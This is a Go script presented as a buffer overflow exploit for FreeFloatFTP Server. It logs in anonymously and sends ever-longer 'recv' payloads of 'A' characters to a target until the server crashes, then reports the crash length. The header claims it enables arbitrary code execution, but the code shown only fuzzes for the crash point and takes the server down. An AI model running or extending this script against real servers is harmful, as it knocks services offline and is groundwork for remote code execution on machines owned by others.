// Buffer overflow exploit for FreeFloatFTP Server
// By disastrpc @ github.com/disastrpc
// FreeFloatFTP server suffers from a buffer overflow vulnerability that allows arbitrary code to be executed by sending a sufficiently large RECV offset. This allows for arbitrary code execution to be performed on remote machines. Credentials are needed if anonymous access is not allowed.

//Notes
//crash at 300 bytes
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func buildPayload(s int) string {

	var buff string
	buff += strings.Repeat("A", s)
	return buff
}

func main() {
	target := os.Args[1]

	for i := 100; i < 2000; i += 100 {
		conn, err := net.DialTimeout("tcp", target, 5*time.Second)
		if err != nil && i <= 100 {
			fmt.Println("Error dialing TCP address")
			os.Exit(1)
		} else if err != nil {
			fmt.Printf("Crash occurred with %d bytes\n", i-100)
			os.Exit(0)
		}

		reader := bufio.NewReader(conn)
		reader.ReadString('\n')
		fmt.Fprintf(conn, "USER anonymous\r")
		reader.ReadString('\n')
		fmt.Fprintf(conn, "PASS anonymous\r")
		fmt.Fprintf(conn, "recv %v\r", buildPayload(i))
		reader.ReadString('\n')
		fmt.Printf("Sending %d bytes\n", i)
		time.Sleep(1 * time.Second)
		conn.Close()
	}
}
